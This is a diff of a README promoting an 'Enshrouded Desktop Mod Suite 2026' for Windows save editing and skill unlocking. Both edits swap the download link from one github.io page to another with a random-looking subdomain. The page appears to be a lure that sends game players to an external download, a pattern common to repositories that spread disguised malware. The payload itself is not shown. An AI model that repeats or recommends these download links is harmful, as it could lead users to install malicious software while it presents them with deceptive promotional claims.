@@ -2,7 +2,7 @@
 
 Enshrouded Desktop Mod Suite 2026 is the ultimate companion for Enshrouded players on Windows, offering a wide range of utilities to customize and enhance your gameplay. Whether you want to edit saves, unlock skills, or adjust game parameters, this tool provides a seamless and intuitive experience. Designed for Windows 10 and 11, it ensures compatibility and ease of use for all users.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Now](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## System Requirements
 
@@ -62,7 +62,7 @@ A: For technical support or questions, please open an issue on the GitHub reposi
 
 To get the latest version of the Enshrouded Desktop Mod Suite, visit the download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
